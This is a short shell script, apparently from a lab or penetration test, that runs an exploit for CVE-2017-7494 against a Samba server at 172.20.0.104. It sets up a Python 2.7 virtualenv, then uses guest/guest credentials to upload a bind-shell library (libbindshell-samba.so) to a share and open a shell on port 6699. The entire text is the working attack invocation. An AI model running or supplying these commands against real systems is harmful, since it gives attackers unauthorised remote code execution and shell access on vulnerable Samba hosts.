cd /opt/exploit-CVE-2017-7494
python2.7 -m virtualenv venv
[ -f venv/bin/activate ] && source venv/bin/activate
python2.7 exploit.py -t 172.20.0.104 \
    -e libbindshell-samba.so \
    -s myshare \
    -r /home/share/libbindshell-samba.so \
    -u guest -p guest \
    -P 6699